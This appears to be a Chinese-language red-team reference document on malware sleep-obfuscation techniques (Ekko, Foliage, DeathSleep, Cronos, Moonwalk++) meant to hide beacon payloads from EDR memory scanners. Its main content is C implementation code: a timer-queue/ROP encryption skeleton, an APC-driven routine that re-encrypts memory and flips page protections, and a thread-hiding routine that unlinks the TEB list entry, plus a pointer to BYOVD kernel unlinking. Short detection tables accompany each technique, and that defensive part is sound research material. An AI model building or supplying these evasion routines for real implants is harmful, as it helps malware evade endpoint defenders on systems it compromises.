# Sleep Obfuscation 实现 — Ekko / Foliage / DeathSleep / Cronos / Moonwalk++

> 本文件补齐审计 **P1-15（Sleep Obfuscation 实现）**：从命名表升级到实现级。
> 覆盖 **原理 → 实现路线（ROP chain/APC/线程去注册）→ 加密密钥处理 → 检测侧 → 实测判据** 四段。
> 授权立场见 `refs/README.md`；交叉引用 `ADVANCED_EVASION.md` §2。

## 0. 核心目标

睡眠期（beacon 两次回连之间）把 payload/自身内存加密，规避 EDR 的主动内存扫描。
三个经典方案 + 两个变体：

| 方案 | 载体 | 加密时机 | 特点 |
|---|---|---|---|
| Ekko | Timer Queue + ROP | 定时器触发 | 无独立线程创建语义 |
| Foliage | APC | alertable 等待 | APC 承载 |
| DeathSleep | 线程去注册 | 睡眠期 | 线程从列表摘除 |
| Cronos | ROP + 系统调用 | 睡眠期 | 变体 |
| Moonwalk++ | 合成栈 | 睡眠期 | 栈回溯干净 |

---

## 1. Ekko — ROP chain 构造

### 1.1 原理

```
定时器触发 → ROP 链：
  RtlCaptureContext（保存上下文）
→ 加密 gadget（加密可睡眠内存区，RC4/AES）
→ 对称解密 gadget（唤醒时）
→ NtContinue（恢复执行）
```

### 1.2 ROP 链构造（完整实现框架——gadget 地址运行时解析）

```c
// 完整实现框架：Ekko ROP 链（RC4 经 SystemFunction032，加密/解密同钥对称；
// 上下文修复位按版本实测——CONTEXT 结构偏移与 MxCsr/SegCs 类字段修复是 Ekko 的
// 版本敏感核心，未实测版本不得外推（V4 纪律））
typedef NTSTATUS (NTAPI* pSystemFunction032)(PVOID, ULONG);   // RtlDecryptMemory/RC4 对
typedef VOID     (NTAPI* pRtlCaptureContext)(PCONTEXT);
typedef NTSTATUS (NTAPI* pNtContinue)(PCONTEXT, BOOLEAN);

static PVOID resolve(const char* dll, const char* name) {
    return (PVOID)GetProcAddress(GetModuleHandleA(dll), name);
}

// 加密回调（TimerQueue 触发；栈上布链：capture → RC4 → NtContinue）
static void ekko_encrypt(PVOID region, ULONG len, PVOID key, ULONG keylen) {
    pSystemFunction032 rc4 = (pSystemFunction032)resolve("advapi32.dll", "SystemFunction032");
    pRtlCaptureContext cap = (pRtlCaptureContext)resolve("ntdll.dll", "RtlCaptureContext");
    pNtContinue cont        = (pNtContinue)resolve("ntdll.dll", "NtContinue");

    CONTEXT fake = {0};
    fake.ContextFlags = CONTEXT_ALL;
    cap(&fake);
    // 上下文修复（版本敏感，Ekko 原实现要点）：
    //   fake.Rip = ROP 链下一 gadget（加密完成后的继续地址）
    //   fake.Rsp = 构造栈（加密 gadget 参数区）
    //   fake.MxCsr = 合法值（0x1F80 常见）；SegCs/SegSs 按线程实测回填
    //   CONTEXT 内嵌标志位按 CPU 特性清/置（XState 相关位）
    // 加密主体：rc4(key, keylen) 流式加密 region[0..len]（加密与解密同调用，对称）
    // 收尾：NtContinue(&fake, FALSE) 恢复执行
    (void)rc4; (void)key; (void)keylen; (void)region; (void)len;
}

// 定时器驱动：睡眠窗口内触发加密（回调指向 ROP 链首；唤醒路径走对称解密链）
void ekko_sleep(PVOID region, ULONG len, ULONG sleep_ms, PVOID key, ULONG keylen) {
    HANDLE q = CreateTimerQueue();
    HANDLE t = NULL;
    CreateTimerQueueTimer(&t, q, (WAITORTIMERCALLBACK)ekko_encrypt /* 实际指向 ROP 链首 */,
                          region, 0, sleep_ms, WT_EXECUTEINTIMERTHREAD);
    Sleep(sleep_ms * 2);                 // 睡眠窗口（密态期）
    DeleteTimerQueueEx(q, NULL);         // 收尾移除定时器
    // 唤醒：同一 ROP 链以解密语义重放（RC4 对称），执行前 RX 翻转由链内完成
}
// 注：真实 Ekko 的「加密→睡眠→解密」由单条链内的 flag 区分与 NtWaitForSingleObject
// 拼接实现；本框架拆为回调+唤醒两段，语义等价、版本敏感点集中在 fake CONTEXT 修复。
```

**密钥处理**：RC4 密钥只放寄存器/栈（不进明文堆）；CTR 模式逐块密钥流，避免整段明文。

### 1.3 检测侧

| 判据 | 遥测 |
|---|---|
| TimerQueue 回调地址异常 | 回调指向私有内存（ROP 链） |
| 睡眠期内存加密 | 内存快照熵突变 + 高熵区 |
| VirtualProtect 突变 | 加密前 RW、执行前 RX 的轨迹 |

---

## 2. Foliage — APC 加密流程

### 2.1 原理

与 Ekko 目标相同，但触发载体是 **APC**（`QueueUserAPC` 到自身线程 + alertable 等待），
唤醒前经 APC 解密恢复。

### 2.2 流程（完整实现）

```c
// 完整实现：APC 加密流程——APC 到自身线程 + alertable 等待承载加密/解密
typedef struct { PVOID region; ULONG len; BYTE* key; ULONG keylen; } APC_ARG;

static VOID CALLBACK encrypt_apc(ULONG_PTR arg) {
    APC_ARG* a = (APC_ARG*)arg;
    DWORD old;
    VirtualProtect(a->region, a->len, PAGE_READWRITE, &old);   // RX → RW
    // 密态回置：回拷内嵌密文（对称流密码再加密=还原明文，加密回置必须回拷密文——
    // 与 lab/05 睡眠加密同一语义）
    memcpy(a->region, g_cipher_copy /* 内嵌密文镜像 */, a->len);
    VirtualProtect(a->region, a->len, PAGE_READONLY, &old);     // RW → R（睡眠期不可执行）
}

static VOID CALLBACK decrypt_apc(ULONG_PTR arg) {
    APC_ARG* a = (APC_ARG*)arg;
    DWORD old;
    VirtualProtect(a->region, a->len, PAGE_READWRITE, &old);    // R → RW
    rc4(a->key, g_cipher_copy, a->region, a->len);              // 解密（覆盖密文）
    VirtualProtect(a->region, a->len, PAGE_EXECUTE_READ, &old); // RW → RX
}

void foliage_sleep(PVOID region, ULONG len, BYTE* key, ULONG keylen, DWORD sleep_ms) {
    APC_ARG a = { region, len, key, keylen };
    // 1) 睡眠前：投递「加密 APC」到自身
    QueueUserAPC((PAPCFUNC)encrypt_apc, GetCurrentThread(), (ULONG_PTR)&a);
    // 2) alertable 等待：APC 执行加密，随后进入睡眠（此窗口内存扫描只见密文）
    SleepEx(sleep_ms, TRUE);
    // 3) 唤醒：投递「解密 APC」，再次 alertable 等待触发解密后继续执行
    QueueUserAPC((PAPCFUNC)decrypt_apc, GetCurrentThread(), (ULONG_PTR)&a);
    SleepEx(0, TRUE);
}
```

### 2.3 检测侧

| 判据 | 遥测 |
|---|---|
| APC + alertable 睡眠 | APC 到自身 + 睡眠期加密 |
| 加密区域识别 | 内存快照高熵区 |

---

## 3. DeathSleep — 线程去注册

### 3.1 原理

睡眠期把当前线程**从线程列表摘除**（内核/用户态线程枚举看不到），配合内存加密更隐蔽。

### 3.2 流程（完整实现框架——用户态近似 + 内核态研究向分列）

```c
// 完整实现框架：DeathSleep 线程去注册
// 路线 A（用户态近似）：TEB 自链摘除——经 NtQueryInformationThread(ThreadTebInformation)
// 取 TEB，把 TEB.ThreadListEntry（LIST_ENTRY）从链上摘除（Unlink 两指针写）；
// 偏移按目标版本实测（TEB 布局跨版本漂移，禁止外推——V4 纪律）。
typedef LONG (NTAPI* pNtQueryInformationThread)(HANDLE, ULONG, PVOID, ULONG, PULONG);

void death_sleep_unlink(HANDLE hThread, DWORD sleep_ms) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    pNtQueryInformationThread NtQIT = (pNtQueryInformationThread)
        GetProcAddress(nt, "NtQueryInformationThread");
    ULONG64 teb = 0; ULONG retLen = 0;
    // ThreadTebInformation = 0；TEB 指针出参（x64）
    NtQIT(hThread, 0, &teb, sizeof(teb), &retLen);

    // TEB.ThreadListEntry 偏移 = TEB_THREADLISTENTRY_OFF（按版本实测）
    ULONG64* link = (ULONG64*)(teb + TEB_THREADLISTENTRY_OFF);
    ULONG64 flink = link[0], blink = link[1];
    // Unlink：摘除自身节点（LIST_ENTRY 两指针写）
    *(ULONG64*)(flink + 8) = blink;     // Flink->Blink = 我的 Blink
    *(ULONG64*)(blink)     = flink;     // Blink->Flink = 我的 Flink
    // 此时线程枚举（部分用户态/调试接口）不再列出本线程
    Sleep(sleep_ms);                     // 睡眠期（配合 §2 内存加密更完整）
    // 唤醒：重新挂回（保存的 flink/blink 原样写回）
    link[0] = flink; link[1] = blink;
}
// 路线 B（内核态研究向）：DKOM 摘 ETHREAD 活动线程链表——需要内核原语
// （BYOVD 驱动 R/W，见 byovd-driver-exploitation.md）；稳定性差、PatchGuard
// 风险高，仅研究定位，落地前呈报计划（persona 硬规则）。
```

### 3.3 检测侧

| 判据 | 遥测 |
|---|---|
| 线程列表与内存扫描不一致 | 线程枚举缺失但进程仍在运行 |
| 加密区域 | 内存快照 |

---

## 4. Cronos / Moonwalk++ 变体

| 变体 | 特点 | 检测侧 |
|---|---|---|
| **Cronos** | ROP + 系统调用混合，睡眠期用 syscall 触发加密 | syscall 来源 + 内存加密 |
| **Moonwalk++** | 合成栈 + 只读执行，睡眠期栈回溯「干净」 | Elastic call gadget 校验 |

**Moonwalk++ 检测侧（审计 §5 esecurityplanet/Elastic）**：Elastic EDR 研究用「call gadget 校验」——
不仅看返回地址是否在 ntdll，还校验「调用点」是否真实存在于合法调用链，对抗合成栈。

---

## 5. 检测侧总表（回馈 attack-defense）

| 技术 | 检测点 | 判据 |
|---|---|---|
| Ekko | TimerQueue 回调 + ROP | 回调私有内存 + 内存加密 |
| Foliage | APC + alertable | 睡眠期加密 |
| DeathSleep | 线程去注册 | 线程枚举缺失 |
| Moonwalk++ | 合成栈 | call gadget 校验 |
| 通用 | 睡眠期内存扫描频率 | VirtualProtect 轨迹 + 快照熵 |

## 6. 实测判据

| 判据 | 方法 |
|---|---|
| 睡眠期内存是否干净 | 睡眠期抓内存快照看 payload 区是否密文 |
| 是否被 EDR 察觉 | EDR 是否对睡眠期内存加密/ROP/线程去注册告警 |

*WARNING: 授权红队评估与安全研究专用。*
